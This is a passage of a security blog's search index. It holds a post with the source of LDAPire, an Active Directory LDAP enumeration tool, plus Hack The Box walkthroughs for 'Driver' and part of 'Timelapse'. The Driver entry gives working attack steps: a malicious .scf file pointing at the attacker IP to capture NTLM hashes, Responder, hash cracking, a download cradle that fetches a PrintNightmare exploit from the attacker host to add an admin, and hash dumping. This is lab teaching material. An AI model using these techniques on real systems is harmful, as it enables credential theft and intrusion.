        "content": " Originally posted on 2024-10-17 updated on 2024-11-13 Introducing LDAPire: A Tool for Active Directory Reconnaissance As penetration testers and security professionals, we often find ourselves needing to quickly assess and enumerate Active Directory environments. Today, I\u0026rsquo;m excited to share a tool I\u0026rsquo;ve developed that streamlines this process: LDAPire - the LDAP Checker and Enumerator.\nYou can find the full source code and installation instructions for LDAPire on my GitHub repository: LDAPire on GitHub It\u0026rsquo;s very much in it\u0026rsquo;s infancy, however I plan on adding more features. What is LDAPire? LDAPire is a Python-based tool designed to connect to LDAP servers (primarily Active Directory Domain Controllers), perform authentication, and enumerate users and groups. It\u0026rsquo;s built with flexibility and ease of use in mind, making it an invaluable addition to any pentester\u0026rsquo;s toolkit.\nKey Features Advanced Connection Handling:\nSSL/TLS support with automatic fallback to non-SSL Support for both anonymous and authenticated binds Secure credential handling and validation Comprehensive Enumeration:\nComplete enumeration of users, groups, computers, and all domain objects Detailed attribute collection with proper formatting Advanced binary attribute handling (SIDs, GUIDs, Exchange attributes) Service Account Detection:\nAutomated identification of potential service accounts Pattern matching for common service account naming conventions Context-aware results with surrounding information Output Organization:\nBasic Information Files:\nUsers.txt: User SAM account names Groups.txt: Group SAM account names Computers.txt: Computer SAM account names Objects.txt: All object SAM account names Detailed Information Files:\nUsersDetailed.txt: Comprehensive user attributes GroupsDetailed.txt: Comprehensive group attributes ComputersDetailed.txt: Comprehensive computer attributes ObjectsDetailedLdap.txt: All domain object details Special Reports:\nAllObjectDescriptions.txt: Consolidated descriptions ServiceAccounts.txt: Potential service account findings Security Features:\nAnonymous bind detection and warning Secure credential handling Informative security status reporting Why Use This Tool? Time-Saving: Quickly gather essential AD information without manual queries or multiple tools. Comprehensive Data: Get both high-level and detailed views of users and groups in one go. Flexibility: Works with various AD configurations and authentication scenarios. Pentesting-Oriented: Designed with the needs of security professionals in mind. Code: I have placed the code here for convenience.\n#!/usr/bin/env python3 from ldap3 import Server, Connection, ALL, SUBTREE from ldap3.core.exceptions import LDAPException import re import argparse import logging import getpass import sys def is_valid_ip(ip): pattern = re.compile(r\u0026#34;^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$\u0026#34;) return pattern.match(ip) is not None # Setup logging logging.basicConfig(filename=\u0026#39;ldap_test.log\u0026#39;, level=logging.INFO) # Command-line argument parsing parser = argparse.ArgumentParser(description=\u0026#34;LDAP Anonymous Bind Test\u0026#34;) parser.add_argument(\u0026#39;dc_ip\u0026#39;, help=\u0026#34;IP address of the Domain Controller\u0026#34;) parser.add_argument(\u0026#39;-u\u0026#39;, \u0026#39;--user\u0026#39;, help=\u0026#34;Username for authentication\u0026#34;, default=\u0026#39;\u0026#39;) parser.add_argument(\u0026#39;-p\u0026#39;, \u0026#39;--password\u0026#39;, help=\u0026#34;Password for authentication\u0026#34;, default=\u0026#39;\u0026#39;) args = parser.parse_args() # Validate IP address srver = args.dc_ip if not is_valid_ip(srver): print(\u0026#34;Invalid IP address format.\u0026#34;) logging.error(f\u0026#34;Invalid IP address format: {srver}\u0026#34;) exit(1) # Handle secure password input user = args.user password = args.password if not password and user: password = getpass.getpass(\u0026#34;Enter password: \u0026#34;) def get_domain_from_dc_ip(dc_ip): try: import socket domain = socket.gethostbyaddr(dc_ip)[0] return \u0026#39;.\u0026#39;.join(domain.split(\u0026#39;.\u0026#39;)[1:]) # Remove the hostname part except: return None def construct_user_string(user, dc_ip): if \u0026#39;\\\\\u0026#39; in user or \u0026#39;,\u0026#39; in user: # Already in DOMAIN\\user or DN format return user domain = get_domain_from_dc_ip(dc_ip) if domain: return f\u0026#34;{domain}\\\\{user}\u0026#34; else: return user # Fallback to just the username if domain can\u0026#39;t be determined def attempt_connection(server, use_ssl, user, password): protocol = \u0026#34;ldaps\u0026#34; if use_ssl else \u0026#34;ldap\u0026#34; port = 636 if use_ssl else 389 try: s = Server(server, port=port, use_ssl=use_ssl, get_info=ALL) if user and password: user_string = construct_user_string(user, server) c = Connection(s, user=user_string, password=password, authentication=\u0026#39;SIMPLE\u0026#39;, auto_bind=True) else: c = Connection(s, auto_bind=True) return s, c, True except LDAPException as e: logging.error(f\u0026#34;Error connecting to the server with {protocol}://{server}:{port}: {e}\u0026#34;) return None, None, False def perform_ldap_search(connection, base_dn, search_filter, attribute): try: connection.search(search_base=base_dn, search_filter=search_filter, search_scope=SUBTREE, attributes=[attribute]) return [entry[attribute].value for entry in connection.entries if attribute in entry] except LDAPException as e: logging.error(f\u0026#34;Error performing LDAP search: {e}\u0026#34;) return [] def write_results_to_file(results, filename): with open(filename, \u0026#39;w\u0026#39;) as f: for item in results: f.write(f\u0026#34;{item}\\n\u0026#34;) print(f\u0026#34;Results written to {filename}\\n\u0026#34;) def perform_ldap_search_all_attributes(connection, base_dn, search_filter): try: connection.search(search_base=base_dn, search_filter=search_filter, search_scope=SUBTREE, attributes=[\u0026#39;*\u0026#39;]) return connection.entries except LDAPException as e: logging.error(f\u0026#34;Error performing LDAP search: {e}\u0026#34;) return [] def write_detailed_results_to_file(results, filename): with open(filename, \u0026#39;w\u0026#39;) as f: for entry in results: f.write(f\u0026#34;DN: {entry.entry_dn}\\n\u0026#34;) for attribute in entry.entry_attributes: values = entry[attribute].values if len(values) == 1: f.write(f\u0026#34;{attribute}: {values[0]}\\n\u0026#34;) else: f.write(f\u0026#34;{attribute}:\\n\u0026#34;) for value in values: f.write(f\u0026#34; {value}\\n\u0026#34;) f.write(\u0026#34;\\n\u0026#34;) print(f\u0026#34;Detailed results written to {filename}\u0026#34;) def main(): # Attempt to connect with SSL first, then without SSL for use_ssl in [True, False]: protocol = \u0026#34;SSL\u0026#34; if use_ssl else \u0026#34;non-SSL\u0026#34; print(f\u0026#34;Attempting to connect to {args.dc_ip} with {protocol}...\u0026#34;) logging.info(f\u0026#34;Attempting to connect to {args.dc_ip} with {protocol}\u0026#34;) s, c, checkserver = attempt_connection(args.dc_ip, use_ssl, user, password) if checkserver: print(f\u0026#34;Connected successfully using {\u0026#39;authenticated\u0026#39; if user else \u0026#39;anonymous\u0026#39;} bind. Retrieving server information...\u0026#34;) logging.info(f\u0026#34;Connected successfully using {\u0026#39;authenticated\u0026#39; if user else \u0026#39;anonymous\u0026#39;} bind\u0026#34;) print(s.info) # Extract domain components from the server\u0026#39;s info domain_components = s.info.other[\u0026#39;defaultNamingContext\u0026#39;][0].split(\u0026#39;,\u0026#39;) base_dn = \u0026#39;,\u0026#39;.join(dc for dc in domain_components if dc.startswith(\u0026#39;DC=\u0026#39;)) # Search for users (sAMAccountName only) print(\u0026#34;Searching for users (sAMAccountName)...\u0026#34;) users = perform_ldap_search(c, base_dn, \u0026#39;(\u0026amp;(objectclass=user))\u0026#39;, \u0026#39;sAMAccountName\u0026#39;) write_results_to_file(users, \u0026#39;usersLdap.txt\u0026#39;) # Search for users (all attributes) print(\u0026#34;Searching for users (all attributes)...\u0026#34;) users_detailed = perform_ldap_search_all_attributes(c, base_dn, \u0026#39;(\u0026amp;(objectclass=user))\u0026#39;) write_detailed_results_to_file(users_detailed, \u0026#39;usersLdap_detailed.txt\u0026#39;) # Search for groups print(\u0026#34;Searching for groups...\u0026#34;) groups = perform_ldap_search(c, base_dn, \u0026#39;(\u0026amp;(objectclass=group))\u0026#39;, \u0026#39;sAMAccountName\u0026#39;) write_results_to_file(groups, \u0026#39;groupsLdap.txt\u0026#39;) # Search for groups (all attributes) print(\u0026#34;Searching for groups (all attributes)...\u0026#34;) groups_detailed = perform_ldap_search_all_attributes(c, base_dn, \u0026#39;(\u0026amp;(objectclass=group))\u0026#39;) write_detailed_results_to_file(groups_detailed, \u0026#39;groupsLdap_detailed.txt\u0026#39;) break else: print(f\u0026#34;Failed to connect with {protocol}.\u0026#34;) logging.warning(f\u0026#34;Failed to connect with {protocol}.\u0026#34;) if not checkserver: print(\u0026#34;Failed to connect: Server does not allow LDAP bind or invalid credentials.\u0026#34;) logging.error(\u0026#34;Failed to connect: Server does not allow LDAP bind or invalid credentials.\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() How to Use It Using the tool is straightforward. After installation, you can run it with the following syntax:\npython3 ldapire.py [DC_IP] [-u USERNAME] [-p PASSWORD] For example:\n# Authenticated enumeration python3 ldapire.py 192.168.1.1 -u \u0026#34;DOMAIN\\\\username\u0026#34; -p \u0026#34;password\u0026#34; # Anonymous enumeration python3 ldapire.py 192.168.1.1 The tool provides clear console output showing progress:\n============================================================ LDAP Information Retrieval Domain Enumeration ============================================================ Processing Users... Processing Groups... Processing Computers... Processing All Objects... Processing Descriptions... Searching for Service Accounts... Output and Analysis The tool generates several output files for different aspects of enumeration:\nBasic Information Files:\nUsers.txt: Simple list of user SAM account names Groups.txt: List of group SAM account names Computers.txt: List of computer SAM account names Objects.txt: List of all object SAM account names Detailed Information Files:\nUsersDetailed.txt: Comprehensive user attributes GroupsDetailed.txt: Comprehensive group attributes ComputersDetailed.txt: Comprehensive computer attributes ObjectsDetailedLdap.txt: All domain object details Special Reports:\nAllObjectDescriptions.txt: Consolidated descriptions from all objects ServiceAccounts.txt: Identified potential service accounts with context The detailed files include proper formatting of binary attributes such as: Security Identifiers (SIDs) GUIDs Exchange-specific attributes Other binary data types Ethical Considerations As with any tool, it\u0026rsquo;s crucial to use LDAPire responsibly and ethically. Always ensure you have explicit permission to test and enumerate the target Active Directory environment.\nHappy hunting!\nBloodstiller\nP.S. Remember, you can find the full source code and contribute to the project on the GitHub repository ", 
        "url": "http:\/\/localhost:1313\/tools\/ldapire\/"
    },
    
    "http:\/\/localhost:1313\/tags\/python\/": {
        "title": "Python",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/python\/"
    },
    
    "http:\/\/localhost:1313\/tags\/cfs\/": {
        "title": "CFS",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/cfs\/"
    },
    
    "http:\/\/localhost:1313\/tags\/cve-2021-1675\/": {
        "title": "CVE-2021-1675",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/cve-2021-1675\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/driver-box\/": {
        "title": "Driver HTB Walkthrough",
        "tags": ["Box","HTB","Easy","Windows","LDAP","Responder","CFS","PrintNightmare","CVE-2021-1675","Download Cradle",],
        "content": "Driver Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Driver How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in Walkthroughs/HTB/BlogEntriesMade/Driver/scans 🍣 main 📝 ×139🛤️ ×1 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 09:49:09 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 09:49 GMT Nmap scan report for 10.129.250.87 Host is up (0.038s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 445/tcp open microsoft-ds Nmap done: 1 IP address (1 host up) scanned in 5.34 seconds Initial thoughts: RPC Web SMB Comprehensive Scans: In depth scan TCP: sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in Walkthroughs/HTB/BlogEntriesMade/Driver/scans 🍣 main 📝 ×139🛤️ ×1 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 09:49:57 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 09:50 GMT Nmap scan report for 10.129.250.87 Host is up (0.067s latency). Not shown: 65531 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=MFP Firmware Update Center. Please enter password for admin | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb2-time: | date: 2024-11-11T16:53:11 |_ start_date: 2024-11-11T16:45:48 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 186.52 seconds Findings: It says above \u0026quot;Please enter password for admin\u0026quot; which means there is some sort of admin panel present I imagine. This is not part of a domain as it says it\u0026rsquo;s part of a WORKGROUP: 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares Both are disabled: +Discoveries+: What is interesting is that it\u0026rsquo;s running SMBv1 and we have the windows version also Windows 10 Enterprise 10240 x64 RPC: +Cheatsheet+: I have an enumeration \u0026amp; attacking cheatsheet for RPC, available here:\nhttps://bloodstiller.com/cheatsheets/rpc-cheatsheet/#enumerating-rpc-using-rpcclient Null session via RPC:\nMuch like SMB you can also connect to RPC via null \u0026amp; guest sessions, let\u0026rsquo;s see if they are valid here: rpcclient -U \u0026quot;\u0026quot; $box rpcclient -U '%' $box Both fail. Web 80: Web Enumeration via Burp Suite: When enumerating a website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. Website Overview: Immediately when I try and access the site I am greeted with a basic authentication panel. As we saw above it says \u0026quot;Please enter password for admin\u0026quot; I enter default creds of admin:admin and get access. We can see there is an email address at the bottom too, lets add this to our list: Enumerating Injection Points: The only viable injection point is the upload page. Where can upload a file that will be manually checked \u0026amp; tested.\nWe may be able to upload a reverse shell. We can see the website is running .php so we can use a php reverse web shell. I use the pentestmonkey one that is on revshells:\nI upload the shell and start my listener: I do not get a hit though: Directory Enumeration the web-server using ffuf: I Perform some directory busting to see if there are any interesting directories:\nffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$box/FUZZ -fc 403 -ic Nothing interesting from an unauthenticated session. I try dirbusting with an authenticated session by passing base64 encoded credentials:\nBase64 encode our credentials: echo -n 'admin:admin' | base64 Dirbust: ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$box/FUZZ -fc 403 -ic -H \u0026quot;Authorization: Basic YWRtaW46YWRtaW4=\u0026quot; Again nothing of note. 2. Foothold: Using an SCF File to get a users NTLM hash: As this host allows uploads it may be possible to upload a malicious .scf file to force them to authenticate back to our attack host and send us their NTLM hash.\nI save the below as a .scf file:\n[Shell] Command=2 IconFile=\\\\10.10.14.97\\share\\LasjetJet.ico [Taskbar] Command=ToggleDesktop +Note+: I name it @PrinterDriver.scf so it\u0026rsquo;s something similar what would be uploaded so it does not arouse suspicion \u0026amp; looks legitimate. Put an @ at the start of the name so it appears at the top and ensure it is executed as soon as the user accesses the share it is in. This way the user does not need to click on it and it will trigger. This type of attack is typically done with SMB shares. I start responder:\nsudo responder -wd -v -I tun0 I upload the .scf:\nI get a hit \u0026amp; get back the user tony\u0026rsquo;s NTLM hash:\nSCF (Shell Command File) Primer: Purpose: Originally designed for quick access to certain Windows system commands, like opening Windows Explorer or the Recycle Bin.\nFile Extension: .scf\nFormat: Plain text file with commands in a specific format, commonly referencing icon locations.\nCommon Fields:\n[Shell] – Header indicating it’s an SCF file. Command – Specifies the command or action to take, like opening Windows Explorer. IconFile – Points to an icon resource (e.g., file path or UNC path). Exploitability:\nSCF files can be exploited because Windows automatically renders icon files specified in SCF files. By pointing the IconFile field to a remote UNC path, an attacker can trigger Windows Explorer to initiate an SMB connection to the specified path, leaking NTLM hashes in the process. Mitigation Tips:\nDisabling SMBv1 and securing SMB authentication settings can help mitigate risks associated with SCF file exploitation. Recent versions of Windows Server (2019+) handle SCF files differently, limiting their exploitability. SCF Exploit Explained: SCF File Exploit: SCF (Shell Command File\u0026rsquo;s): Can be modified to point its icon file location to a specific UNC (Universal Naming Convention) path, typically an IP address. Result of manipulation: Windows Explorer automatically initiates an SMB (Server Message Block) session when accessing the folder with the modified .scf file. This action sends the victim\u0026rsquo;s NTLMv2 hash to our attack host. Exploitation Tools: Tools like Responder, Inveigh, or InveighZero can be used to poison and capture the NTLMv2 hashes sent by the victim. +Simplified Explanation+: By putting a malicious .scf file on the target that points to our host the victim will attempt to authenticate back to us and in doing so will send their NTLMv2 hash which we can capture +Note+: If the target system is Windows Server 2019 or newer, an LNK file must be used instead of an SCF file. Cracking Tony\u0026rsquo;s hash with hashcat: I crack it with hashcat: hashcat -m 5600 tony.hash /home/kali/Wordlists/rockyou.txt -O Verify they work: Enumerating Users with RPC: I connect using rpcclient and list the users:\nrpcclient -U 'tony' $box There are only 2 other users other than tony, Guest (which is disabled and Administrator) I check the description field for the Administrator user in-case there is a password in it etc:\nqueryuser 0x1f4 There isn\u0026rsquo;t :( Enumerating as Tony: I connect via evil winrm:\nevil-winrm -i $box -u $user -p $pass Grab the user flag:\nI check PowerShell history but nothing:\n(Get-PSReadLineOption).HistorySavePath Check my privs:\nwhoami /priv Nothing interesting. I Check the fw_up.php and index.php:\nI check both the website .php files in the web-root(wwwroot) but neither hold anything interesting. 3. Privilege Escalation: Discovering the host is vulnerable to PrintNightmare CVE-2021-1675: As the box is called driver and there have been various nods to printers I check if the it\u0026rsquo;s susceptible to PrintNightmare with netexec: netexec smb $box -u $user -p $pass -M printnightmare It is, lets attack. +Note+: I have a priv-esc checklist that I run through when I am working on machines and checking for PrintNightmare is one of these checks (I didn\u0026rsquo;t just magically stumble upon the idea). However now we have a viable path forward. Adding an Admin User using PrintNightmare CVE-2021-1675: Get exploit:\nLets get the POC. wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/refs/heads/main/CVE-2021-1675.ps1 Start python server:\npython3 -m http.server 9000 +Note+: I have this command aliased to pws Use download cradle to load into memory:\niex(new-object net.webclient).downloadstring('http://10.10.14.97:9000/CVE-2021-1675.ps1') +Deep Dive+: I have a deep dive into download cradles and how they work:\nhttps://bloodstiller.com/articles/understandingdownloadcradles/ Create new user \u0026amp; add them to the admins:\nInvoke-Nightmare -NewUser \u0026quot;bloodstiller\u0026quot; -NewPassword \u0026quot;bl00dst1ll3r!\u0026quot; -DriverName \u0026quot;PrintIt\u0026quot; Verify the user has been added:\nnet user bloodstiller They have been. Verify the creds work:\nGet flag:\nDump hashes with impacket-secretsdump:\nimpacket-secretsdump $domain/$user:$pass@$box Lessons Learned: What did I learn? It took me a long time to see you could upload an SCF so long as it was being accessed from a share/etc it would work. What silly mistakes did I make? Not too many, may be getting better, here\u0026rsquo;s hoping. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/driver-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/printnightmare\/": {
        "title": "PrintNightmare",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/printnightmare\/"
    },
    
    "http:\/\/localhost:1313\/tags\/responder\/": {
        "title": "Responder",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/responder\/"
    },
    
    "http:\/\/localhost:1313\/tags\/john\/": {
        "title": "John",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/john\/"
    },
    
    "http:\/\/localhost:1313\/tags\/laps\/": {
        "title": "LAPS",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/laps\/"
    },
    
    "http:\/\/localhost:1313\/tags\/pfx\/": {
        "title": "Pfx",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/pfx\/"
    },
    
    "http:\/\/localhost:1313\/tags\/powershell\/": {
        "title": "PowerShell",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/powershell\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/timelapse-box\/": {
        "title": "Timelapse HTB Walkthrough",
        "tags": ["Box","HTB","Easy","Windows","LDAP","Active Directory","LAPS","pfx","john",],
        "content": "Timelapse Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Timelapse How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/Timelapse/scans/nmap 🍣 main 3GiB/7GiB | 268kiB/1GiB with /usr/bin/zsh 🕙 22:16:09 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 22:16 GMT Nmap scan report for 10.129.227.113 Host is up (0.040s latency). Not shown: 991 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 593/tcp open http-rpc-epmap 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 4.41 seconds Initial thoughts: DNS Kerberos SMB LDAP RPC Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in content-org/Walkthroughs/HTB/BlogEntriesMade/Timelapse 🍣 main 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 22:22:24 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 06:14 GMT Stats: 0:02:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 77.90% done; ETC: 06:17 (0:00:35 remaining) Stats: 0:02:48 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 11.76% done; ETC: 06:18 (0:00:45 remaining) Nmap scan report for 10.129.123.90 Host is up (0.039s latency). Not shown: 65518 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-11 14:17:46Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 3269/tcp open globalcatLDAPssl? 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_ssl-date: 2024-11-11T14:19:20+00:00; +8h00m00s from scanner time. | ssl-cert: Subject: commonName=dc01.timelapse.htb | Not valid before: 2021-10-25T14:05:29 |_Not valid after: 2022-10-25T14:25:29 | tls-alpn: |_ http/1.1 |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49695/tcp open msrpc Microsoft Windows RPC 49724/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2024-11-11T14:18:40 |_ start_date: N/A OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 262.82 seconds LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 /home/kali/windowsTools/enumeration/ldapire.py $box It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Users It turns out the anonymous bind is not enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in HTB/BlogEntriesMade/Timelapse/scans/ldap 🍣 main 3GiB/7GiB | 268kiB/1GiB with /usr/bin/zsh 🕙 22:17:33 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire.py $box Attempting to connect to 10.129.227.113 with SSL... Failed to connect with SSL. Attempting to connect to 10.129.227.113 with non-SSL... Connected successfully using anonymous bind. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=timelapse,DC=htb CN=Configuration,DC=timelapse,DC=htb CN=Schema,CN=Configuration,DC=timelapse,DC=htb DC=DomainDnsZones,DC=timelapse,DC=htb DC=ForestDnsZones,DC=timelapse,DC=htb We have the domain functionality level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=timelapse,DC=htb The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=timelapse,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. Updating ETC/HOSTS \u0026amp; Variables: Updated Domain \u0026amp; Machine Variables for Testing:\nNow that I have this information, I can update the domain and machine variables used in tests: update_var domain \u0026quot;timelapse.htb\u0026quot; update_var machine \u0026quot;DC01\u0026quot; Updating /etc/hosts for DNS and LDAP Queries:\nI update my /etc/hosts file to enable tools like kerbrute for user enumeration and other tools that require DNS or LDAP for queries: echo \u0026quot;$box $domain $machine.$domain\u0026quot; | sudo tee -a /etc/hosts Syncing Clocks for Kerberos Exploitation: Since Kerberos is enabled on this host, it\u0026rsquo;s best practice to sync our clock with the host’s. This helps avoid issues from clock 